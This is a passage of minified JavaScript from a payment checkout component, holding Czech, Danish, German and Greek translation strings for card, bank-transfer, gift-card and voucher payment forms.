zúčtování","error.giftcard.no-balance":"Na dárkové kartě je nulový zůstatek","error.giftcard.card-error":"V našich záznamech není žádná dárková karta s tímto číslem","error.giftcard.currency-error":"Dárkové karty jsou platné jenom v měně, ve které byly vystavené","amazonpay.signout":"Odhlásit se z Amazonu","amazonpay.changePaymentDetails":"Změnit údaje o platbě","partialPayment.warning":"Zvolte jiný způsob platby pro platbu zbývajících","partialPayment.remainingBalance":"Zbývající zůstatek bude %{amount}","bankTransfer.beneficiary":"Příjemce","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Odkaz","bankTransfer.introduction":"Vytvořte novou platbu bankovním převodem. K dokončení této platby můžete použít údaje na následující obrazovce.","bankTransfer.instructions":"Děkujeme za nákup. K dokončení platby použijte prosím následující informace.","bacs.accountHolderName":"Jméno držitele bankovního účtu","bacs.accountHolderName.invalid":"Neplatné jméno držitele bankovního účtu","bacs.accountNumber":"Číslo bankovního účtu","bacs.accountNumber.invalid":"Neplatné číslo bankovního účtu","bacs.bankLocationId":"Kód Sort","bacs.bankLocationId.invalid":"Neplatný kód Sort","bacs.consent.amount":"Souhlasím s tím, že mi bude následující částka odečtena z bankovního účtu.","bacs.consent.account":"Potvrzuji, že účet je veden na moje jméno a jsem jediným disponentem, jehož podpis je nutný ke schválení přímého inkasa.",edit:"Editovat","bacs.confirm":"Potvrdit a zaplatit","bacs.result.introduction":"Stáhněte si pokyny k přímému inkasu (DDI / podpisové právo)","download.pdf":"Stáhnout PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe pro číslo zabezpečené karty","creditCard.encryptedCardNumber.aria.label":"Pole pro číslo karty","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe pro datum vypršení platnosti zabezpečené karty","creditCard.encryptedExpiryDate.aria.label":"Pole pro datum vypršení platnosti","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe pro měsíc vypršení platnosti zabezpečené karty","creditCard.encryptedExpiryMonth.aria.label":"Pole pro měsíc vypršení platnosti","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe pro rok vypršení platnosti zabezpečené karty","creditCard.encryptedExpiryYear.aria.label":"Pole pro rok vypršení platnosti","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe pro bezpečnostní kód zabezpečené karty","creditCard.encryptedSecurityCode.aria.label":"Pole pro bezpečnostní kód","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe pro číslo zabezpečené dárkové karty","giftcard.encryptedCardNumber.aria.label":"Pole pro číslo dárkové karty","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe pro bezpečnostní kód zabezpečené dárkové karty","giftcard.encryptedSecurityCode.aria.label":"Pole pro bezpečnostní kód dárkové karty",giftcardTransactionLimit:"Maximální povolená částka za jednu transakci touto dárkovou kartou je %{amount}.","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe pro číslo zabezpečeného bankovního účtu","ach.encryptedBankAccountNumber.aria.label":"Pole pro bankovní účet","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe pro číslo zabezpečeného kódu banky","ach.encryptedBankLocationId.aria.label":"Pole pro kód banky"}}),$v=Object.freeze({__proto__:null,default:{payButton:"Betal","payButton.redirecting":"Omdirigerer ...",storeDetails:"Gem til min næste betaling","creditCard.holderName":"Navn på kort","creditCard.holderName.placeholder":"J. Hansen","creditCard.holderName.invalid":"Ugyldigt kortholdernavn","creditCard.numberField.title":"Kortnummer","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Udløbsdato","creditCard.expiryDateField.placeholder":"MM/ÅÅ","creditCard.expiryDateField.month":"Måned","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"ÅÅ","creditCard.expiryDateField.year":"År","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Husk til næste gang","creditCard.cvcField.placeholder.4digits":"4 cifre","creditCard.cvcField.placeholder.3digits":"3 cifre","creditCard.taxNumber.placeholder":"ÅÅMMDD/0123456789",installments:"Antal rater",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times} måneder","installments.oneTime":"Engangsbetaling","installments.installments":"Afdragsbetaling","installments.revolving":"Løbende betaling","sepaDirectDebit.ibanField.invalid":"Ugyldigt kontonummer","sepaDirectDebit.nameField.placeholder":"J. Smith","sepa.ownerName":"Kontohavernavn","sepa.ibanNumber":"Kontonummer (IBAN)","error.title":"Fejl","error.subtitle.redirect":"Omdirigering fejlede","error.subtitle.payment":"Betaling fejlede","error.subtitle.refused":"Betaling afvist","error.message.unknown":"Der opstod en ukendt fejl","idealIssuer.selectField.title":"Bank","idealIssuer.selectField.placeholder":"Vælg din bank","creditCard.success":"Betaling gennemført",loading:"Indlæser…",continue:"Fortsæt",continueTo:"Fortsæt til","wechatpay.timetopay":"Du har %@ at betale","wechatpay.scanqrcode":"Scan QR-kode",personalDetails:"Personlige oplysninger",companyDetails:"Virksomhedsoplysninger","companyDetails.name":"Virksomhedsnavn","companyDetails.registrationNumber":"CVR-nummer",socialSecurityNumber:"CPR-nummer",firstName:"Fornavn",infix:"Præfiks",lastName:"Efternavn",mobileNumber:"Mobilnummer","mobileNumber.invalid":"Ugyldigt mobilnummer",city:"By",postalCode:"Postnummer",countryCode:"Landekode",telephoneNumber:"Telefonnummer",dateOfBirth:"Fødselsdato",shopperEmail:"E-mailadresse",gender:"Køn",male:"Mand",female:"Kvinde",billingAddress:"Faktureringsadresse",street:"Gade",stateOrProvince:"Region eller kommune",country:"Land",houseNumberOrName:"Husnummer",separateDeliveryAddress:"Angiv en separat leveringsadresse",deliveryAddress:"Leveringsadresse",zipCode:"Postnummer",apartmentSuite:"Lejlighed/suite",provinceOrTerritory:"Provins eller territorium",cityTown:"By",address:"Adresse",state:"Stat","field.title.optional":"(valgfrit)","creditCard.cvcField.title.optional":"CVC / CVV (valgfrit)","issuerList.wallet.placeholder":"Vælg tegnebog",privacyPolicy:"Politik om privatlivets fred","afterPay.agreement":"Jeg accepterer AfterPays %@",paymentConditions:"betalingsbetingelser",openApp:"Åbn appen","voucher.readInstructions":"Læs anvisningerne","voucher.introduction":"Tak for dit køb. Brug følgende kupon til at gennemføre din betaling.","voucher.expirationDate":"Udløbsdato","voucher.alternativeReference":"Alternativ reference","dragonpay.voucher.non.bank.selectField.placeholder":"Vælg din udbyder","dragonpay.voucher.bank.selectField.placeholder":"Vælg din bank","voucher.paymentReferenceLabel":"Betalingsreference","voucher.surcharge":"Inkl. tillægsbegyr på %@","voucher.introduction.doku":"Tak for dit køb. Brug følgende oplysninger til at gennemføre din betaling.","voucher.shopperName":"Kundenavn","voucher.merchantName":"Sælger","voucher.introduction.econtext":"Tak for dit køb. Brug følgende oplysninger til at gennemføre din betaling.","voucher.telephoneNumber":"Telefonnummer","voucher.shopperReference":"Købers reference","voucher.collectionInstitutionNumber":"Id-nummer til opkrævningsinstitution","voucher.econtext.telephoneNumber.invalid":"Telefonnummer skal bestå af 10 eller 11 cifre","boletobancario.btnLabel":"Generér Boleto","boleto.sendCopyToEmail":"Send en kopi til min e-mail","button.copy":"Kopiér","button.download":"Download","creditCard.storedCard.description.ariaLabel":"Gemt kort ender på %@","voucher.entity":"Enhed",donateButton:"Giv et bidrag",notNowButton:"Ikke nu",thanksForYourSupport:"Tak for din støtte!",preauthorizeWith:"Forhåndsgodkend med",confirmPreauthorization:"Bekræft forhåndsgodkendelse",confirmPurchase:"Bekræft køb",applyGiftcard:"Indløs",giftcardBalance:"Saldo på gavekort",deductedBalance:"Fratrukket saldo","creditCard.pin.title":"Pinkode","creditCard.encryptedPassword.label":"Første 2 cifre i adgangskode til kort","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Ugyldig adgangskode","creditCard.taxNumber.label":"Kortholders fødselsdato (ÅÅMMDD) eller virksomheds registreringsnummer (10 cifre)","creditCard.taxNumber.labelAlt":"Virksomheds registreringsnummer (10 cifre)","creditCard.taxNumber.invalid":"Ugyldig fødselsdato for kortholder eller virksomheds registreringsnummer","storedPaymentMethod.disable.button":"Fjern","storedPaymentMethod.disable.confirmation":"Fjern gemt betalingsmåde","storedPaymentMethod.disable.confirmButton":"Ja, fjern","storedPaymentMethod.disable.cancelButton":"Annuller","ach.bankAccount":"Bankkonto","ach.accountHolderNameField.title":"Kontohavers navn","ach.accountHolderNameField.placeholder":"J. Hansen","ach.accountHolderNameField.invalid":"Ugyldigt kontohavernavn","ach.accountNumberField.title":"Kontonummer","ach.accountNumberField.invalid":"Ugyldigt kontonummer","ach.accountLocationField.title":"ABA-registreringsnummer","ach.accountLocationField.invalid":"Ugyldigt ABA-registreringsnummer","select.state":"Vælg stat","select.stateOrProvince":"Vælg region eller kommune","select.provinceOrTerritory":"Vælg provins eller territorium","select.country":"Vælg land","select.noOptionsFound":"Ingen muligheder fundet","select.filter.placeholder":"Søg ...","telephoneNumber.invalid":"Ugyldigt telefonnummer",qrCodeOrApp:"eller","paypal.processingPayment":"Behandler betaling ...",generateQRCode:"Generér QR-kode","await.waitForConfirmation":"Venter på bekræftelse","mbway.confirmPayment":"Bekræft din betaling på appen MB WAY","shopperEmail.invalid":"Ugyldig e-mailadresse","dateOfBirth.format":"DD/MM/ÅÅÅÅ","dateOfBirth.invalid":"Du skal være mindst 18 år","blik.confirmPayment":"Åbn din bankapp for at bekræfte betalingen.","blik.invalid":"Indtast 6 tal","blik.code":"6-cifret kode","blik.help":"Få koden fra din bankapp.","swish.pendingMessage":"Visning af status kan tage op til 10 minutter efter scanning. Et nyt forsøg på betaling inden for dette tidsrum kan muligvis medføre flere gebyrer.","error.va.gen.01":"Felt ikke udfyldt","error.va.gen.02":"Ugyldigt felt","error.va.sf-cc-num.01":"Ugyldigt kortnummer","error.va.sf-cc-num.03":"Ikke-understøttet kort indtastet","error.va.sf-cc-dat.01":"Kort for gammelt","error.va.sf-cc-dat.02":"Dato for langt ude i fremtiden","error.va.sf-cc-dat.03":"Dit kort udløber før betalingsdatoen","error.giftcard.no-balance":"Saldoen på gavekortet er 0","error.giftcard.card-error":"Vi har ikke et gavekort med dette nummer i vores optegnelser","error.giftcard.currency-error":"Gavekort er kun gyldige i udstedelsesvalutaen","amazonpay.signout":"Log ud af Amazon","amazonpay.changePaymentDetails":"Skift betalingsoplysninger","partialPayment.warning":"Vælg en anden betalingsmåde til betaling af restbeløbet","partialPayment.remainingBalance":"Restbeløbet vil være %{amount}","bankTransfer.beneficiary":"Betalingsmodtager","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Reference","bankTransfer.introduction":"Fortsæt med at oprette ny betalingsoverførsel via bank. Du kan bruge oplysningerne på den følgende skærm til at afslutte betalingen.","bankTransfer.instructions":"Tak for dit køb. Brug følgende oplysninger til at gennemføre din betaling.","bacs.accountHolderName":"Bankkontohavers navn","bacs.accountHolderName.invalid":"Ugyldigt navn på bankkontohaver","bacs.accountNumber":"Bankkontonummer","bacs.accountNumber.invalid":"Ugyldigt bankkontonummer","bacs.bankLocationId":"Registreringsnummer","bacs.bankLocationId.invalid":"Ugyldigt registreringsnummer","bacs.consent.amount":"Jeg accepterer, at beløbet ovenfor trækkes på min bankkonto.","bacs.consent.account":"Jeg bekræfter, at kontoen er i mit navn, og at jeg er den eneste underskriver, der kræves for at godkende direkte debitering af kontoen.",edit:"Rediger","bacs.confirm":"Bekræft, og betal","bacs.result.introduction":"Download vejledningen til direkte debitering (fuldmagt til direkte debitering)","download.pdf":"Download PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe til sikret kortnummer","creditCard.encryptedCardNumber.aria.label":"Kortnummerfelt","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe til udløbsdato for sikret kort","creditCard.encryptedExpiryDate.aria.label":"Felt til udløbsdato","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe til udløbsmåned for sikret kort","creditCard.encryptedExpiryMonth.aria.label":"Felt til udløbsmåned","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe til udløbsår for sikret kort","creditCard.encryptedExpiryYear.aria.label":"Felt til udløbsår","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe til sikkerhedskode for sikret kort","creditCard.encryptedSecurityCode.aria.label":"Felt til sikkerhedskode","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe til nummer for sikret gavekort","giftcard.encryptedCardNumber.aria.label":"Felt til gavekortnummer","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe til sikkerhedskode for sikret gavekort","giftcard.encryptedSecurityCode.aria.label":"Felt til sikkerhedskode for gavekort",giftcardTransactionLimit:"Maks. %{amount} tilladt pr. transaktion på dette gavekort","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe til sikret bankkontonummer","ach.encryptedBankAccountNumber.aria.label":"Felt til bankkonto","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe til registreringsnummer for sikret bank","ach.encryptedBankLocationId.aria.label":"Felt til registreringsnummer for bank"}}),zv=Object.freeze({__proto__:null,default:{payButton:"Zahlen","payButton.redirecting":"Umleiten …",storeDetails:"Für zukünftige Zahlvorgänge speichern","creditCard.holderName":"Name auf der Karte","creditCard.holderName.placeholder":"A. Müller","creditCard.holderName.invalid":"Ungültiger Karteninhabername","creditCard.numberField.title":"Kartennummer","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Ablaufdatum","creditCard.expiryDateField.placeholder":"MM/JJ","creditCard.expiryDateField.month":"Monat","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"JJ","creditCard.expiryDateField.year":"Jahr","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Für das nächste Mal speichern","creditCard.cvcField.placeholder.4digits":"4 Stellen","creditCard.cvcField.placeholder.3digits":"3 Stellen","creditCard.taxNumber.placeholder":"JJMMTT/0123456789",installments:"Anzahl der Raten",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times} Monate","installments.oneTime":"Einmalige Zahlung","installments.installments":"Ratenzahlung","installments.revolving":"Ratenzahlung","sepaDirectDebit.ibanField.invalid":"Ungültige Kontonummer","sepaDirectDebit.nameField.placeholder":"L. Schmidt","sepa.ownerName":"Name des Kontoinhabers","sepa.ibanNumber":"Kontonummer (IBAN)","error.title":"Fehler","error.subtitle.redirect":"Weiterleitung fehlgeschlagen","error.subtitle.payment":"Zahlung fehlgeschlagen","error.subtitle.refused":"Zahlvorgang verweigert","error.message.unknown":"Es ist ein unbekannter Fehler aufgetreten.","idealIssuer.selectField.title":"Bank","idealIssuer.selectField.placeholder":"Wählen Sie Ihre Bank","creditCard.success":"Zahlung erfolgreich",loading:"Laden …",continue:"Weiter",continueTo:"Weiter zu","wechatpay.timetopay":"Sie haben noch %@ um zu zahlen","wechatpay.scanqrcode":"QR-Code scannen",personalDetails:"Persönliche Angaben",companyDetails:"Unternehmensdaten","companyDetails.name":"Unternehmensname","companyDetails.registrationNumber":"Registrierungsnummer",socialSecurityNumber:"Sozialversicherungsnummer",firstName:"Vorname",infix:"Vorwahl",lastName:"Nachname",mobileNumber:"Handynummer","mobileNumber.invalid":"Ungültige Handynummer",city:"Stadt",postalCode:"Postleitzahl",countryCode:"Landesvorwahl",telephoneNumber:"Telefonnummer",dateOfBirth:"Geburtsdatum",shopperEmail:"E-Mail-Adresse",gender:"Geschlecht",male:"Männlich",female:"Weiblich",billingAddress:"Rechnungsadresse",street:"Straße",stateOrProvince:"Bundesland",country:"Land",houseNumberOrName:"Hausnummer",separateDeliveryAddress:"Abweichende Lieferadresse angeben",deliveryAddress:"Lieferadresse",zipCode:"PLZ",apartmentSuite:"Wohnung/Geschoss",provinceOrTerritory:"Provinz oder Territorium",cityTown:"Ort",address:"Straße und Hausnummer",state:"Bundesstaat","field.title.optional":"(optional)","creditCard.cvcField.title.optional":"CVC / CVV (optional)","issuerList.wallet.placeholder":"Virtuelle Brieftasche auswählen",privacyPolicy:"Datenschutz","afterPay.agreement":"Ich bin mit den %@ von AfterPay einverstanden",paymentConditions:"Zahlungsbedingungen",openApp:"App öffnen","voucher.readInstructions":"Anweisungen lesen","voucher.introduction":"Vielen Dank für Ihren Kauf. Bitte schließen Sie Ihre Zahlung unter Verwendung des folgenden Gutscheins ab.","voucher.expirationDate":"Gültig bis","voucher.alternativeReference":"Alternative Referenz","dragonpay.voucher.non.bank.selectField.placeholder":"Anbieter auswählen","dragonpay.voucher.bank.selectField.placeholder":"Bank auswählen","voucher.paymentReferenceLabel":"Zahlungsreferenz","voucher.surcharge":"Inkl. % @Zuschlag","voucher.introduction.doku":"Vielen Dank für Ihren Kauf. Bitte schließen Sie Ihre Zahlung unter Verwendung der folgenden Informationen ab.","voucher.shopperName":"Name des Käufers","voucher.merchantName":"Händler","voucher.introduction.econtext":"Vielen Dank für Ihren Kauf. Bitte schließen Sie Ihre Zahlung unter Verwendung der folgenden Informationen ab.","voucher.telephoneNumber":"Telefonnummer","voucher.shopperReference":"Kundenreferenz","voucher.collectionInstitutionNumber":"Nummer der Zahlungsannahmestelle","voucher.econtext.telephoneNumber.invalid":"Die Telefonnummer muss 10- oder 11-stellig sein","boletobancario.btnLabel":"Boleto generieren","boleto.sendCopyToEmail":"Eine Kopie an meine E-Mail-Adresse senden","button.copy":"Kopieren","button.download":"Herunterladen","creditCard.storedCard.description.ariaLabel":"Gespeicherte Karte endet auf %@","voucher.entity":"Entität",donateButton:"Spenden",notNowButton:"Nicht jetzt",thanksForYourSupport:"Danke für Ihre Unterstützung!",preauthorizeWith:"Vorautorisieren mit",confirmPreauthorization:"Vorautorisierung bestätigen",confirmPurchase:"Kauf bestätigen",applyGiftcard:"Einlösen",giftcardBalance:"Saldo der Geschenkkarte",deductedBalance:"Abgezogener Betrag","creditCard.pin.title":"PIN","creditCard.encryptedPassword.label":"Die ersten zwei Ziffern des Kartenpassworts","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Ungültiges Passwort","creditCard.taxNumber.label":"Geburtsdatum des Karteninhabers (JJMMTT) oder Unternehmensregistrierungsnummer (10-stellig)","creditCard.taxNumber.labelAlt":"Unternehmensregistrierungsnummer (10-stellig)","creditCard.taxNumber.invalid":"Ungültiges Geburtsdatum des Karteninhabers oder ungültige Unternehmensregistrierungsnummer","storedPaymentMethod.disable.button":"Entfernen","storedPaymentMethod.disable.confirmation":"Gespeicherte Zahlungsmethode entfernen","storedPaymentMethod.disable.confirmButton":"Ja, entfernen","storedPaymentMethod.disable.cancelButton":"Abbrechen","ach.bankAccount":"Bankkonto","ach.accountHolderNameField.title":"Name des Kontoinhabers","ach.accountHolderNameField.placeholder":"A. Müller","ach.accountHolderNameField.invalid":"Ungültiger Kontoinhabername","ach.accountNumberField.title":"Kontonummer","ach.accountNumberField.invalid":"Ungültige Kontonummer","ach.accountLocationField.title":"ABA-Nummer","ach.accountLocationField.invalid":"Ungültige ABA-Nummer","select.state":"Bundesstaat auswählen","select.stateOrProvince":"Bundesland oder Provinz/Region auswählen","select.provinceOrTerritory":"Provinz oder Territorium auswählen","select.country":"Land auswählen","select.noOptionsFound":"Keine Optionen gefunden","select.filter.placeholder":"Suche …","telephoneNumber.invalid":"Ungültige Telefonnummer",qrCodeOrApp:"oder","paypal.processingPayment":"Zahlung wird verarbeitet …",generateQRCode:"QR-Code generieren","await.waitForConfirmation":"Warten auf Bestätigung","mbway.confirmPayment":"Bestätigen Sie Ihre Zahlung in der MB WAY-App","shopperEmail.invalid":"Ungültige E-Mail-Adresse","dateOfBirth.format":"TT.MM.JJJJ","dateOfBirth.invalid":"Sie müssen mindestens 18 Jahre alt sein","blik.confirmPayment":"Öffnen Sie Ihre Banking-App, um die Zahlung zu bestätigen.","blik.invalid":"6 Zahlen eingeben","blik.code":"6-stelliger Code","blik.help":"Rufen Sie den Code über Ihre Banking-App ab.","swish.pendingMessage":"Es kann sein, dass der Status bis zu 10 Minuten nach dem Scan „ausstehend“ lautet. Wenn Sie währenddessen einen neuen Zahlungsversuch unternehmen, kann es sein, dass Ihnen mehrere Beträge in Rechnung gestellt werden.","error.va.gen.01":"Feld nicht ausgefüllt","error.va.gen.02":"Feld ungültig","error.va.sf-cc-num.01":"Ungültige Kartennummer","error.va.sf-cc-num.03":"Nicht unterstützte Karte eingegeben","error.va.sf-cc-dat.01":"Karte zu alt","error.va.sf-cc-dat.02":"Datum zu weit in der Zukunft","error.va.sf-cc-dat.03":"Ihre Karte läuft vor dem Bezahldatum ab.","error.giftcard.no-balance":"Auf dieser Geschenkkarte ist kein Guthaben vorhanden","error.giftcard.card-error":"Es gibt in unserem System keine Geschenkkarte mit dieser Nummer","error.giftcard.currency-error":"Geschenkkarten sind nur in der Währung gültig, in der sie ausgestellt wurden","amazonpay.signout":"Von Amazon abmelden","amazonpay.changePaymentDetails":"Zahlungsinformationen ändern","partialPayment.warning":"Wählen Sie eine andere Zahlungsmethode zur Zahlung des Restbetrags","partialPayment.remainingBalance":"Es verbleibt ein Restbetrag von %{amount}","bankTransfer.beneficiary":"Empfänger","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Referenz","bankTransfer.introduction":"Fortfahren, um eine neue Banküberweisungszahlung zu erstellen. Sie können die Informationen auf dem nächsten Bildschirm verwenden, um diese Zahlung abzuschließen.","bankTransfer.instructions":"Vielen Dank für Ihren Kauf. Bitte schließen Sie Ihre Zahlung unter Verwendung der folgenden Informationen ab.","bacs.accountHolderName":"Name des Bankkontoinhabers","bacs.accountHolderName.invalid":"Ungültiger Bankkontoinhabername","bacs.accountNumber":"Bankkontonummer","bacs.accountNumber.invalid":"Ungültige Bankkontonummer","bacs.bankLocationId":"Bankleitzahl","bacs.bankLocationId.invalid":"Ungültige Bankleitzahl","bacs.consent.amount":"Ich bin damit einverstanden, dass der oben genannte Betrag von meinem Bankkonto abgebucht wird.","bacs.consent.account":"Ich bestätige, dass das Konto unter meinem Namen läuft und ich der einzige erforderliche Unterzeichner bin, um die Lastschrift für dieses Konto zu autorisieren.",edit:"Bearbeiten","bacs.confirm":"Bestätigen und bezahlen","bacs.result.introduction":"Laden Sie Ihre Lastschriftanweisung (DDI/Einzugsermächtigung) herunter","download.pdf":"PDF herunterladen","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe für Nummer der gesicherten Karte","creditCard.encryptedCardNumber.aria.label":"Feld „Kartennummer“","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe für Ablaufdatum der gesicherten Karte","creditCard.encryptedExpiryDate.aria.label":"Feld „Ablaufdatum“","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe für Monat des Ablaufdatums der gesicherten Karte","creditCard.encryptedExpiryMonth.aria.label":"Feld „Monat des Ablaufdatums“","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe für Jahr des Ablaufdatums der gesicherten Karte","creditCard.encryptedExpiryYear.aria.label":"Feld „Jahr des Ablaufdatums“","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe für Sicherheitscode der gesicherten Karte","creditCard.encryptedSecurityCode.aria.label":"Feld „Sicherheitscode“","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe für Geschenkkartennummer der gesicherten Karte","giftcard.encryptedCardNumber.aria.label":"Feld „Geschenkkartennummer“","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe für Sicherheitscode der gesicherten Geschenkkarte","giftcard.encryptedSecurityCode.aria.label":"Feld „Sicherheitscode der Geschenkkarte“",giftcardTransactionLimit:"Der zulässige Höchstbetrag pro Transaktion für diese Geschenkkarte ist %{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe für gesicherte Bankkontonummer","ach.encryptedBankAccountNumber.aria.label":"Feld „Bankkonto“","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe für gesicherte BLZ","ach.encryptedBankLocationId.aria.label":"Bankleitzahl-Feld"}}),Hv=Object.freeze({__proto__:null,default:{payButton:"Πληρωμή","payButton.redirecting":"Ανακατεύθυνση...",storeDetails:"Αποθήκευση για την επόμενη πληρωμή μου","creditCard.holderName":"Όνομα στην κάρτα","creditCard.holderName.placeholder":"Γ. Παπαδάκης","creditCard.holderName.invalid":"Μη έγκυρο όνομα κατόχου κάρτας","creditCard.numberField.title":"Αριθμός κάρτας","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Ημερομηνία λήξης","creditCard.expiryDateField.placeholder":"ΜΜ/ΕΕ","creditCard.expiryDateField.month":"Μήνας","creditCard.expiryDateField.month.placeholder":"ΜΜ","creditCard.expiryDateField.year.placeholder":"ΕΕ","creditCard.expiryDateField.year":"Έτος","creditCard.cvcField.title":"CVC/CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Απομνημόνευση για την επόμενη φορά","creditCard.cvcField.placeholder.4digits":"4ψήφιος","creditCard.cvcField.placeholder.3digits":"3ψήφιος","creditCard.taxNumber.placeholder":"ΕΕΜΜΗΗ / 0123456789",installments:"Αριθμός δόσεων",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times} μήνες","installments.oneTime":"Εφάπαξ πληρωμή","installments.installments":"Πληρωμή με δόσεις","installments.revolving":"Ανακυκλούμενη πληρωμή","sepaDirectDebit.ibanField.invalid":"Μη έγκυρος αριθμός λογαριασμού","sepaDirectDebit.nameField.placeholder":"Γ. Παπαδάκης","sepa.ownerName":"Όνομα κατόχου","sepa.ibanNumber":"Αριθμός λογαριασμού (IBAN)","error.title":"Σφάλμα","error.subtitle.redirect":"Η ανακατεύθυνση απέτυχε","error.subtitle.payment":"Η πληρωμή απέτυχε","error.subtitle.refused":"Η πληρωμή απορρίφθηκε","error.message.unknown":"Προέκυψε άγνωστο σφάλμα","idealIssuer.selectField.title":"Τράπεζα","idealIssuer.selectField.placeholder":"Επιλέξτε την τράπεζά σας","creditCard.success":"Η πληρωμή ολοκληρώθηκε επιτυχώς",loading:"Φόρτωση...",continue:"Συνέχεια",continueTo:"Μετάβαση στην","wechatpay.timetopay":"Έχετε στη διάθεσή σας %@ για την πληρωμή","wechatpay.scanqrcode":"Σάρωση κωδικού QR",personalDetails:"Προσωπικά στοιχεία",companyDetails:"Στοιχεία εταιρείας","companyDetails.name":"Όνομα εταιρείας","companyDetails.registrationNumber":"Αριθμός μητρώου",socialSecurityNumber:"Αριθμός φορολογικού μητρώου",firstName:"Όνομα",infix:"Πρόθεμα",lastName:"Επώνυμο",mobileNumber:"Αριθμός κινητού","mobileNumber.invalid":"Μη έγκυρος αριθμός κινητού",city:"Πόλη",postalCode:"Ταχυδρομικός κωδικός",countryCode:"Κωδικός χώρας",telephoneNumber:"Αριθμός τηλεφώνου",dateOfBirth:"Ημερομηνία γέννησης",shopperEmail:"Διεύθυνση email",gender:"Φύλο",male:"Άντρας",female:"Γυναίκα",billingAddress:"Διεύθυνση τιμολόγησης",street:"Οδός",stateOrProvince:"Πολιτεία ή επαρχία",country:"Χώρα",houseNumberOrName:"Αριθμός οικίας",separateDeliveryAddress:"Καθορίστε μια ξεχωριστή διεύθυνση παράδοσης",deliveryAddress:"Διεύθυνση παράδοσης",zipCode:"Ταχυδρομικός κώδικας",apartmentSuite:"Διαμέρισμα/Γραφείο",provinceOrTerritory:"Επαρχία ή περιφέρεια",cityTown:"Πόλη / Κοινότητα",address:"Διεύθυνση",state:"Πολιτεία","field.title.optional":"(προαιρετικό)","creditCard.cvcField.title.optional":"CVC/CVV (προαιρετικά)","issuerList.wallet.placeholder":"Επιλέξτε το πορτοφόλι σας",privacyPolicy:"Πολιτική απορρήτου","afterPay.agreement":"Αποδέχομαι τους %@ του AfterPay",paymentConditions:"όρους πληρωμής",openApp:"Άνοιγμα της εφαρμογής","voucher.readInstructions":"Διαβάστε τις οδηγίες","voucher.introduction":"Σας ευχαριστούμε για την αγορά. Χρησιμοποιήστε το παρακάτω κουπόνι για να ολοκληρώσετε την πληρωμή.","voucher.expirationDate":"Ημερομηνία λήξης","voucher.alternativeReference":"Εναλλακτική αναφορά","dragonpay.voucher.non.bank.selectField.placeholder":"Επιλέξτε τον πάροχό σας","dragonpay.voucher.bank.selectField.placeholder":"Επιλέξτε την τράπεζά σας","voucher.paymentReferenceLabel":"Αναφορά πληρωμής","voucher.surcharge":"Περιλαμβάνεται πρόσθετη χρέωση %@","voucher.introduction.doku":"Σας ευχαριστούμε για την αγορά. Χρησιμοποιήστε τις ακόλουθες πληροφορίες για να ολοκληρώσετε την πληρωμή.","voucher.shopperName":"Όνομα αγοραστή","voucher.merchantName":"Έμπορος","voucher.introduction.econtext":"Σας ευχαριστούμε για την αγορά. Χρησιμοποιήστε τις ακόλουθες πληροφορίες για να ολοκληρώσετε την πληρωμή.","voucher.telephoneNumber":"Αριθμός τηλεφώνου","voucher.shopperReference":"Αναφορά αγοραστή","voucher.collectionInstitutionNumber":"Αριθμός πρακτορείου εισπράξεων","voucher.econtext.telephoneNumber.invalid":"Ο αριθμός τηλεφώνου πρέπει να περιέχει 10 ή 11 ψηφία","boletobancario.btnLabel":"Δημιουργία Boleto","boleto.sendCopyToEmail":"Αποστολή αντιγράφου στη διεύθυνση email μου","button.copy":"Αντιγραφή","button.download":"Λήψη","creditCard.storedCard.description.ariaLabel":"Η αποθηκευμένη κάρτα τελειώνει σε %@","voucher.entity":"Οντότητα",donateButton:"Δωρεά",notNowButton:"Όχι τώρα",thanksForYourSupport:"Σας ευχαριστούμε για την υποστήριξη!",preauthorizeWith:"Προεξουσιοδότηση με",confirmPreauthorization:"Επιβεβαίωση προεξουσιοδότησης",confirmPurchase:"Επιβεβαίωση 